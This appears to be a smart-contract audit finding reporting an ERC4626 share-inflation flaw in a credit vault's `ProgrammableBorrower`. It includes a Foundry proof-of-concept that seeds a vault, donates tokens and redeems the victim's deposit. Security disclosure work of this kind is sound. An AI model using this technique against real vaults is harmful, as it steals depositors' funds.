### Title
ERC4626 share inflation can steal programmable-borrower deposits - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` deposits idle credit-vault principal into an arbitrary ERC4626 vault and accepts the returned share count without enforcing a minimum number of shares or minimum asset value. [1](#0-0)  The factory accepts any configured ERC4626 vault whose `asset()` matches the pool underlying, but does not require existing liquidity, a protected deployment, virtual shares, or a minimum share price. [2](#0-1) [3](#0-2) 

An unprivileged vault user can therefore seed an empty or nearly empty vault, donate underlying to inflate the asset-per-share ratio, and cause the programmable borrower's deposit to mint zero or dust shares. [4](#0-3)  The attacker then redeems their shares and captures both the donation and the pool deposit, while the credit vault later discovers that its strategy-token principal is not backed by recoverable borrower liquidity. [5](#0-4) [6](#0-5) 

### Finding Description
`IdleCreditVaultFactory.deployRevolvingCreditVault` deploys a programmable-borrower facility and passes an operator-selected ERC4626 vault address to `ProgrammableBorrower.initialize`. [7](#0-6)  Initialization validates only that the vault asset equals the credit-vault underlying and then grants the vault unlimited underlying allowance. [3](#0-2) 

When the first epoch starts, `IdleCDOEpochVariant` transfers the available pool balance to the borrower address and invokes the programmable-borrower start hook. [8](#0-7)  `onStartEpoch` snapshots `underlying balance + current vault assets`, deposits the full on-hand balance through `_depositToVault`, and records the pre-deposit amount as `epochStartVaultAssets`. [9](#0-8) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but ignores the returned `shares` for accounting or validation. [1](#0-0)  In a standard ERC4626 implementation, `deposit` computes shares as `assets * totalSupply / totalAssets`; after an attacker creates `1` share and donates at least approximately the pool deposit amount, the pool deposit rounds down to zero shares. [10](#0-9) 

The vault position is subsequently valued through share conversion in `_vaultNetInterest`, so zero shares make the entire deposited principal appear as vault loss. [11](#0-10)  `totalInterestDueNow` floors that loss-adjusted result at zero rather than surfacing the stolen principal as immediately payable cash. [12](#0-11) 

At a later principal recall, `onStopEpoch` returns success when the requested shortfall exceeds `_currentVaultAssets()`, leaving the subsequent `transferFrom` to fail and forcing the credit vault into its borrower-default path. [5](#0-4) [6](#0-5)  The fallback marks the facility defaulted, pauses deposits, stops the epoch, and disables new withdrawal requests. [13](#0-12) 

### Impact Explanation
For a standard vulnerable ERC4626 vault with no meaningful existing liquidity, the attacker can steal nearly the full first deposited pool balance. For example, if the pool deposit is `A`, the attacker deposits `1` wei to mint one share and donates `A`; the borrower's `A` deposit mints `floor(A / (A + 1)) == 0` shares, leaving the attacker as the sole shareholder and able to redeem approximately `2A + 1`, for a net profit of approximately `A`. [1](#0-0) 

The pool loses recoverable backing for the full deposited principal, while tranche and strategy accounting can continue to represent that principal until a close or attempted recall exposes the cash shortfall. [14](#0-13)  At that point the failed borrower transfer triggers hard default and recovery distribution, so absent external recovery the loss is ultimately borne by tranche holders and withdrawal-receipt holders. [15](#0-14) [16](#0-15) 

### Likelihood Explanation
The exploit requires the configured ERC4626 vault to have low enough supply and assets that donation-based share-price inflation can make the pool deposit mint zero or economically worthless shares. [1](#0-0)  It is most practical before the first programmable-borrower vault deposit or after migration to a fresh vault, because a deep established vault can make the required donation uneconomical. [17](#0-16) 

The attacker needs no privileged credit-vault role: depositing into and donating to a public ERC4626 vault are ordinary unprivileged actions. The owner and manager remain honest; the defect is that they may configure a standards-compliant but uninflated vault and the borrower adapter does not verify that the received shares represent the deposited assets. [18](#0-17) 

### Recommendation
Require a minimum economically meaningful share quantity or redeemed-asset value for every vault deposit, calculated against an expected maximum slippage/rounding bound. At minimum, `_depositToVault` should compute `assetsExpected = vault.convertToAssets(shares)` and revert when it is materially below `_assetAmount`; stronger protection would use `previewDeposit` plus an explicit `minShares` bound and a nonzero-share check. [1](#0-0) 

Factory and initialization flows should also reject empty vaults unless the deployment supplies a protected first deposit or the selected vault implements virtual-share inflation protection. `setVault` should apply the same liquidity/inflation checks before approval, not merely validate `asset()`. [19](#0-18) [17](#0-16) 

### Proof of Concept
A Foundry regression can reproduce the mechanism without compromising any privileged role:

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
function testVaultInflationStealsFirstEpochDeposit() external {
    // `this` acts as idleCDO for the focused reproduction.
    uint256 poolAssets = 1_000_000e6;
    address attacker = makeAddr("attacker");

    // Deploy a standard ERC4626 implementation over the forked USDC asset.
    Vault4626 vault = new Vault4626(IERC20Metadata(USDC));

    ProgrammableBorrower pb = ProgrammableBorrower(address(
        new TransparentUpgradeableProxy(
            address(new ProgrammableBorrower()),
            proxyAdmin,
            abi.encodeWithSelector(
                ProgrammableBorrower.initialize.selector,
                address(vault),
                address(this),       // idleCDO; expose token() == USDC
                owner,
                manager,
                borrower,
                10e18
            )
        )
    ));

    // Attacker seeds one share and donates approximately the victim deposit.
    deal(USDC, attacker, poolAssets + 1);
    vm.startPrank(attacker);
    IERC20(USDC).approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);
    IERC20(USDC).transfer(address(vault), poolAssets);
    vm.stopPrank();

    // Simulate the first startEpoch transfer into ProgrammableBorrower.
    deal(USDC, address(pb), poolAssets);
    pb.onStartEpoch(0);

    assertEq(vault.balanceOf(address(pb)), 0);
    assertEq(pb.vaultInterestAccrued(), 0);
    assertEq(pb.vaultLoss(), poolAssets);

    // The sole attacker share redeems attacker capital plus the pool deposit.
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);
    assertEq(IERC20(USDC).balanceOf(attacker), 2 * poolAssets + 1);

    // A principal recall cannot be funded: the hook reports insufficient vault
    // coverage and the CDO's subsequent transferFrom fails.
    assertTrue(pb.onStopEpoch(poolAssets, false));
    vm.expectRevert();
    IERC20(USDC).transferFrom(address(pb), address(this), poolAssets);
}
```

The critical assertions are that `vault.deposit` leaves the programmable borrower with zero shares while `epochStartVaultAssets` remains `poolAssets`, and that the attacker redeems approximately `poolAssets` more than they contributed. The integrated path reaches the same code because `IdleCDOEpochVariant.startEpoch` transfers pool funds to `_borrower()` and invokes `onStartEpoch`, while a later full recall enters `onStopEpoch` and then `getFundsFromBorrower`. [8](#0-7) [20](#0-19)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-222)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-334)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L336-346)
```text
  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCreditVaultFactory.sol (L85-90)
```text
  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L126-150)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
    if (ancillaryParams.writeOffImplementation != address(0)) revert WriteOffUnsupported();
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    cvParams.apr = 0;
    cvParams.isInterestMinted = true;
    cvParams.disableInstantWithdraw = true;
    cvParams.isDepositDuringEpochDisabled = true;
    (IdleCDOEpochVariant cv, IdleCreditVault strategy) = _deployBaseCreditVault(strategyData, cvParams);
    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);

    ProgrammableBorrower programmableBorrower = _deployProgrammableBorrower(
      programmableBorrowerParams,
      cv,
      strategy,
      manager
    );
```

**File:** contracts/IdleCreditVaultFactory.sol (L210-233)
```text
  function _deployProgrammableBorrower(
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    address manager
  ) internal returns (ProgrammableBorrower programmableBorrower) {
    programmableBorrower = ProgrammableBorrower(_deployProxy(
      programmableBorrowerParams.implementation,
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        programmableBorrowerParams.vault,
        address(cv),
        address(this),
        manager,
        programmableBorrowerParams.borrower,
        programmableBorrowerParams.borrowerApr
      )
    ));

    strategy.setBorrower(address(programmableBorrower));
    // Programmable mode is explicit and should always be enabled on the revolving path.
    cv.setIsProgrammableBorrower(true);
    programmableBorrower.transferOwnership(treasury);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-298)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```

**File:** contracts/IdleCDOEpochVariant.sol (L367-373)
```text
    if (_isRequestingAllFunds) {
      // Recall gross strategy-token principal, including fee backing excluded from net CDO NAV.
      // Prefunded variants also add queue deposits already sent directly to the borrower.
      _totBorrowed += _contractTokenBalance(strategyToken);
      _expectedInterest += _totBorrowed;
    }
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-410)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L577-598)
```text
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
```

**File:** contracts/interfaces/IERC4626.sol (L98-102)
```text
     */
    function previewDeposit(uint256 assets) external view returns (uint256 shares);

    /**
     * @dev Mints shares Vault shares to receiver by depositing exactly amount of underlying tokens.
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L661-710)
```text
  function finalizeDefaultRecovery(uint256 _recoveredAmount, address _recoverySource) external returns (uint256 defaultBBNav) {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    if (defaultRecoveryFinalized || !cdo.defaulted()) revert NotAllowed();
    if (_recoveredAmount != 0 && _recoverySource == address(0)) revert NotAllowed();

    // Active holders are still represented by strategy tokens owned by the CDO. Add the
    // default-epoch net interest so they use the same claim basis as pending redeemers.
    // Split gross backing by saved NAV and default interest by the configured APR split.
    // The CDO strategy-token balance is its gross active value before `unclaimedFees`.
    // Using it directly restores those waived unpaid fees to active recovery basis.
    uint256 activeBalance = balanceOf(idleCDO);
    uint256 activeInterest = _defaultActiveInterestBasis(cdo);
    uint256 activeBasis = activeBalance + activeInterest;
    defaultBBNav = _defaultBBBasis(cdo, activeBalance, activeInterest);
    // Pending receipts have already left active CDO NAV, so they are added as a separate basis.
    uint256 pendingBasis = defaultPendingClaimBasis();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (totalBasis == 0) revert NotAllowed();

    // Some recovery funds may already be in this strategy: partially prefunded instant requests
    // and borrower-send funds that failed at epoch start. Count both without pulling them again.
    uint256 prefundedReserve = _defaultPrefundedInstantReserve();
    uint256 reserveAmount = _recoveredAmount + prefundedReserve + defaultRecoveryReserve;
    // Recovery can be above par if the recovered funds exceed the computed basis.
    uint256 recoveryPrice = reserveAmount * RECOVERY_FULL / totalBasis;

    defaultRecoveryFinalized = true;
    defaultRecoveryReserve = reserveAmount;
    defaultRecoveryPrice = recoveryPrice;
    defaultRecoveryEpoch = epochNumber;
    // A non-zero pending instant bucket means current-epoch instant receipts were not fully funded
    // and must be paid through the same recovery ratio as normal pending receipts.
    defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0;
    // Bring active CDO NAV to the same recovery ratio. IdleCDOEpochVariant then calls
    // _forceUpdateAccounting so tranche prices/virtualPrice expose the crystallized loss.
    uint256 activeFinalNAV = (activeBasis * recoveryPrice) / RECOVERY_FULL;
    defaultBBNav = defaultBBNav * recoveryPrice / RECOVERY_FULL;
    if (activeBalance > activeFinalNAV) {
      _burn(idleCDO, activeBalance - activeFinalNAV);
    } else if (activeFinalNAV > activeBalance) {
      _mint(idleCDO, activeFinalNAV - activeBalance);
    }
    if (_recoveredAmount != 0) {
      // Pull external recovery last: if the transfer fails, the whole finalization reverts.
      underlyingToken.safeTransferFrom(_recoverySource, address(this), _recoveredAmount);
    }
  }
```
